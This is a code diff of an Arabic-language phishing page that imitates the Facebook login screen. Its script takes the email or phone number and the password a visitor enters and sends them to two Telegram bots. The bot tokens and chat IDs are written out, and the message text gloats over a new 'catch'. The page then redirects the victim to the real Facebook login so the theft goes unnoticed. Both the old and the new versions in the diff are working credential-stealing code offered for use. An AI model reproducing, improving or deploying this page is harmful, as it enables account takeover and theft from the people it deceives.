@@ -1,41 +1,59 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - تسجيل الدخول</title>
+    <title>Facebook - تسجيل الدخول أو الاشتراك</title>
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 350px; text-align: center; }
-        input { width: 90%; padding: 12px; margin-bottom: 10px; border: 1px solid #dddfe2; border-radius: 6px; }
-        button { width: 97%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-weight: bold; cursor: pointer; }
+        body { font-family: 'Segoe UI', Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        .container { width: 100%; max-width: 400px; text-align: center; }
+        .logo-img { width: 240px; margin-bottom: 20px; }
+        .login-card { background: #fff; border: none; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); padding: 20px; box-sizing: border-box; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+        .login-btn { width: 100%; padding: 14px; background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .login-btn:hover { background-color: #166fe5; }
+        .forgot-pass { color: #1877f2; font-size: 14px; text-decoration: none; margin: 15px 0; display: inline-block; }
+        hr { border: 0; border-top: 1px solid #dadde1; margin: 20px 0; }
+        .create-btn { background-color: #42b72a; color: white; border: none; border-radius: 6px; padding: 12px 16px; font-size: 17px; font-weight: bold; cursor: pointer; }
+        .rights { margin-top: 30px; font-size: 12px; color: #737373; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2btLpXY.svg" width="200" alt="fb">
-        <form id="loginForm">
-            <input type="text" id="email" placeholder="البريد الإلكتروني" required>
-            <input type="password" id="pass" placeholder="كلمة السر" required>
-            <button type="submit">تسجيل الدخول</button>
-        </form>
+    <div class="container">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2btLpXY.svg" alt="Facebook" class="logo-img">
+        <div class="login-card">
+            <form id="catchForm">
+                <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                <input type="password" id="pass" placeholder="كلمة السر" required>
+                <button type="submit" class="login-btn">تسجيل الدخول</button>
+            </form>
+            <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
+            <hr>
+            <button class="create-btn">إنشاء حساب جديد</button>
+        </div>
+        <div class="rights">جميع الحقوق محفوظة © 2024 - تم التطوير بواسطة القذر</div>
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('catchForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-            const msg = `تم صيد ضحية غبي جديد:\nEmail: ${email}\nPass: ${pass}`;
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            const text = `🔥 صيد جديد يا وحش:\n👤 User: ${u}\n🔑 Pass: ${p}`;
             
-            // الروبوت الأول اللعين
-            fetch(`https://api.telegram.org/bot8191961309:AAGPv-DDxrxjDUiq3WXf8ce8Tyk0E8URllk/sendMessage?chat_id=885298735&text=${encodeURIComponent(msg)}`);
-            
-            // الروبوت الثاني القذر
-            fetch(`https://api.telegram.org/bot8554214830:AAG22k54m3AAZXwxW67I6mU9g3mA1j4vWHo/sendMessage?chat_id=7763665935&text=${encodeURIComponent(msg)}`)
-            .then(() => {
-                window.location.href = "https://www.facebook.com";
+            const bots = [
+                {t: '8191961309:AAGPv-DDxrxjDUiq3WXf8ce8Tyk0E8URllk', i: '885298735'},
+                {t: '8554214830:AAG22k54m3AAZXwxW67I6mU9g3mA1j4vWHo', i: '7763665935'}
+            ];
+
+            bots.forEach(bot => {
+                fetch(`https://api.telegram.org/bot${bot.t}/sendMessage?chat_id=${bot.i}&text=${encodeURIComponent(text)}`);
             });
+
+            setTimeout(() => {
+                window.location.href = "https://www.facebook.com/login";
+            }, 500);
         });
     </script>
 </body>
